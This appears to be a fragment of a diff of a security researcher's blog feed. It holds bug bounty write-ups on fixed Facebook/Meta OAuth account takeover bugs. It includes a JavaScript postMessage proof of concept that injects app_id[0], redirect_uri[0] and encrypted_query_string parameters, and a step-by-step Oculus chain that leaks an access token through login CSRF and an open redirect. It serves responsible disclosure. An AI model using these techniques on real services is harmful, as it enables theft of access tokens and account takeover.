-<p><!-- wp:paragraph {"style":{"typography":{"fontSize":"20px"}}} --></p>
-<p style="font-size:20px"><strong>Bug 3: Encrypted Parameters </strong></p>
-<p><!-- /wp:paragraph --></p>
-<p><!-- wp:paragraph --></p>
-<p>At this point, this line of code <strong>(a.app_id = q, a.client_id = q);</strong> was added to ensure that we can't select other app_id than the current one. Of course, as you may notice in the previous blog post, the server side application has weird interpretation about parameters and that's what i focused on. I found out that in case app_id and client_id were forced we can have two other parameters from the message sent which can be named as <strong>app_id[0]</strong> ( its value is an empty string ). Adding this parameter would revoke app_id and we would now get a message that no app_id was specified. I noticed the same behavior with redirect_uri which is carefully generated, in case we add another parameter called <strong>redirect_uri[0]</strong>, this would result in redirect_uri being revoked. </p>
-<p><!-- /wp:paragraph --></p>
-<p><!-- wp:paragraph --></p>
-<p>However, even with this server side behavior we can't actually specify new values for app_id and redirect_uri , we can only revoke them. Likely, i found a new parameter called <strong>encrypted_query_string</strong>. This parameter would contain a set of other parameters and their values but in an encrypted format which can later be decrypted server-side. How would we generate the encrypted string with our desired app_id and redirect_uri? Well it's simple as visiting https://facebook.com/dialog/oauth?app_id=APP_ID&amp;redirect_uri=REDIRECT_URI . Here you should notice that we're requesting <strong>facebook.com</strong> domain and not <strong>www.facebook.com</strong>. A redirect to https://www.facebook.com/dialog/oauth?encrypted_query_string=<strong>ENCODED_FORMAT</strong> would be made.</p>
-<p><!-- /wp:paragraph --></p>
-<p><!-- wp:paragraph --></p>
-<p>Here for our attack to work, we specify APP_ID to the Instagram app_id and redirect_uri to a valid redirect_uri of the Instagram application.</p>
-<p><!-- /wp:paragraph --></p>
-<p><!-- wp:paragraph --></p>
-<p><!-- /wp:paragraph --></p>
-<p><!-- wp:paragraph --></p>
-<p><strong>Proof of concept </strong></p>
-<p><!-- /wp:paragraph --></p>
-<p><!-- wp:code --></p>
-<pre class="wp-block-code"><code lang="javascript" class="language-javascript">msg = JSON.stringify({"jsonrpc":"2.0",
-                                    "method":"showDialog",
-                                    "id":1,
-                                    "params":[{"method":"permissions.oauth","app_id":"Random",
-"client_id":"Random","app_id[0]":"","redirect_uri":"Random",
-"redirect_uri[0]":"","response_type":"token",
-"encrypted_query_string":"<strong>ENCODED_FORMAT</strong>"}]})
-                fullmsg = {xdArbiterHandleMessage:true,message:"FB_RPC:" + msg , origin:"https://ysamm.com"}
-window.parent.postMessage(fullmsg,"*")</code></pre>
-<p><!-- /wp:code --></p>
-<p><!-- wp:paragraph --></p>
-<p>Notice here that we set app_id, client_id and redirect_uri in the message even though their values are going to be replaced because we need to keep this order for the parameters in the request to the OAuth Endpoint. </p>
-<p><!-- /wp:paragraph --></p>
-<p><!-- wp:paragraph --></p>
-<p><strong>Fix</strong></p>
-<p><!-- /wp:paragraph --></p>
-<p><!-- wp:paragraph --></p>
-<p>This time, finally Meta decided to apply the obvious fix and limit the control we have over the OAuth request. A whitelist of allowed parameters was added and the application would filter out any other parameters, of course with app_id and client_id always set to the current app_id.</p>
-<p><!-- /wp:paragraph --></p>
-<p><!-- wp:paragraph --></p>
-<p><strong>Timeline</strong></p>
-<p><!-- /wp:paragraph --></p>
-<p><!-- wp:list {"ordered":true} --></p>
-<ol>
-<li>Sep 23, 2021&mdash; Report Sent <br><meta http-equiv="content-type" content="text/html; charset=utf-8">Sep 24, 2021&mdash;  Acknowledged by Facebook<br><meta http-equiv="content-type" content="text/html; charset=utf-8">Sep 28, 2021&mdash; Fixed by Facebook<br>Oct 14, 2021 &mdash; $42000 bounty  awarded by Facebook.</li>
-<li>Oct 29, 2021&mdash; Report Sent <br><meta http-equiv="content-type" content="text/html; charset=utf-8">Oct 29, 2021&mdash;  Acknowledged by Facebook<br>Dec 10, 2021&mdash; Fixed by Facebook<br>Dec 22, 2021 &mdash; $12500 bounty  awarded by Facebook.</li>
-<li>Jan 10, 2022&mdash; Report Sent <br><meta http-equiv="content-type" content="text/html; charset=utf-8">Jan 11, 2022&mdash;  Acknowledged by Facebook<br><meta http-equiv="content-type" content="text/html; charset=utf-8">Jan 24, 2022&mdash; Fixed by Facebook<br>Mar 3, 2022&mdash; $43750 bounty  awarded by Facebook.</li>
-</ol>
-<p><!-- /wp:list --></p>]]></content><author><name></name></author><category term="Uncategorized" /><summary type="html"><![CDATA[Summary After publishing the write-ups about the bugs i previously found in Facebook Games Platform ( Canvas ), i thought about taking a more in depth look into the code and changes made to it after fixes as sometimes a fix of a bug can introduce another one. In this blog post, i'll write about 3 more bugs found which lead to Facebook Account Takeover. https://ysamm.com/?p=708 Bug 1: Race Condition Bug Llast time i explained in depth how some parts of the code works and actually recommended you to take a look at the rest ( fortunately you didn't ), last time i focused on the parts that construct the request to be sent to Facebook OAuth endpoint, this time i focused on how the result from that request which would contain the access_token would be delivered to the game website in the iframe. Main focus of analysis here is on the PlatformAppController module, showDialog function and more: window.addEventListener("message", function(a) { if (a.data.xdArbiterSyn) d("SecurePostMessage").sendMessageAllowAnyOrigin_UNSAFE(a.source, { xdArbiterAck: !0 }); else if (a.data.xdArbiterRegister) { var b = l.register(a.source, a.data.xdProxyName, a.data.origin, a.origin); ... __d("XdArbiter", ... { ... register: function(a, b, d, e) { e = b != null &amp;&amp; b !== "" ? b : h; c("Arbiter").inform("XdArbiter/register", { origin: d]]></summary></entry><entry><title type="html">Multiple bugs allowed malicious Android Applications to takeover Facebook/Workplace accounts</title><link href="http://localhost:4000/uncategorized/2021/09/30/multiple-bugs-allowed-malicious-android-applications-to-takeover-facebook-workplace-accounts.html" rel="alternate" type="text/html" title="Multiple bugs allowed malicious Android Applications to takeover Facebook/Workplace accounts" /><published>2021-09-30T00:24:59+03:00</published><updated>2021-09-30T00:24:59+03:00</updated><id>http://localhost:4000/uncategorized/2021/09/30/multiple-bugs-allowed-malicious-android-applications-to-takeover-facebook-workplace-accounts</id><content type="html" xml:base="http://localhost:4000/uncategorized/2021/09/30/multiple-bugs-allowed-malicious-android-applications-to-takeover-facebook-workplace-accounts.html"><![CDATA[<p><!-- wp:paragraph --></p>
-<p><strong>Description</strong></p>
-<p><!-- /wp:paragraph --></p>
-<p>These bugs could allow malicious actors who owns Android Applications installed in the victim device alongside Facebook owned Android Applications ( Workplace, Facebook, Messenger .. ) to steal a first-party access token and use it to takeover the user Facebook/Workplace account.</p>
-<p><!--more--></p>
-<p><!-- wp:paragraph --></p>
-<p><strong>Details</strong> </p>
-<p><!-- /wp:paragraph --></p>
-<p><!-- wp:paragraph --></p>]]></content><author><name></name></author><category term="Uncategorized" /><summary type="html"><![CDATA[Description These bugs could allow malicious actors who owns Android Applications installed in the victim device alongside Facebook owned Android Applications ( Workplace, Facebook, Messenger .. ) to steal a first-party access token and use it to takeover the user Facebook/Workplace account. Details]]></summary></entry></feed>
+<p><!-- /wp:paragraph --></p>]]></content><author><name></name></author><category term="Uncategorized" /><summary type="html"><![CDATA[A malicious actor could steal a first-party access token of the Oculus application which he could use to access the Facebook/Oculus accounts. This was possible because the Oculus application in Facebook, which was used to login to Oculus using Facebook accounts has auth.oculus.com/login/ endpoint as a valid redirect_uri. However, Oculus has switched to using Meta Accounts for login. This means that upon visiting auth.oculus.com/login/, the endpoint would redirect to auth.meta.com/oidc/ for login using Meta Accounts and then come back to the auth.oculus.com. We can choose in www.facebook.com OAuth the response_type=token and the token would be passed to the next redirect URL until it reaches again auth.oculus.com. The problem here was that before, auth.oculus.com/login was protecting against token leakage through redirects by having the redirects being made using Javascript , however after the oculus login being changed to Meta accounts and not with Facebook , this protection disappeared and now it directly redirects to the URL initially found in auth.oculus.com/login/?redirect_uri=Redirect_Here. Redirect_Here could be any subdomain of oculus.com and some of them like forums.oculus.com which would redirect to a third party application which can have an open redirect to leak the token ( this was not the open redirect used though ). This bug was simple to find and exploit. Details Setup: 1. Victim is logged-in to Facebook.com2. Victim is not logged-in to Oculus.com ( this is not necessary since we can use a logout CSRF here ) Attack:1) Login CSRF the victim to his Meta account by redirecting to this page https://auth.meta.com/login/facebook/2) Open https://www.facebook.com/v3.1/dialog/oauth?app_id=1517832211847102&amp;redirect_uri=https://auth.oculus.com/login/?redirect_uri=https://forums.oculus.com/openredirect&amp;response_type=token3) After the OAuth flow we can notice that the token ended up in https://forums.oculusvr.com/openredirect#access_token=TOKEN 4) Eventually the access_token would be leaked to https://ysamm.com The open redirect here was not fully disclosed since it's still not fully fixed. Timeline Aug 27, 2022&mdash; Report Sent Sep 25, 2022&mdash;  Acknowledged by MetaSep 25, 2022&mdash; Fixed by MetaSep 25, 2022 &mdash; $44250 bounty awarded by Meta. ( Including BountyCon bonuses and bonus for Highest Impact Report )]]></summary></entry></feed>
